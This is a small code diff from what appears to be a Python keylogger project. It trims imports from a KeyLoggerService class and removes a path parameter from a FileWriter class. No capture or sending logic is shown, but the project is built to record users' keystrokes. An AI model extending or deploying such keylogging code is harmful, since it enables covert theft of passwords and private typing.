@@ -1,4 +1,4 @@
-import requests,time,ToolBox,pygetwindow,json,random,string,os,base64
+import requests,time,ToolBox,pygetwindow,json,os,base64
 from Interface import IKeyLogger,Write
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
@@ -35,7 +35,7 @@ class KeyLoggerService(IKeyLogger):
         self.__logged_keys = {}
 
 class FileWriter(Write):
-    def __init__(self,path=None):
+    def __init__(self):
         self.path = ToolBox.get_file_path()
 
     def write(self, sn, data: dict[str, str]) -> bool:
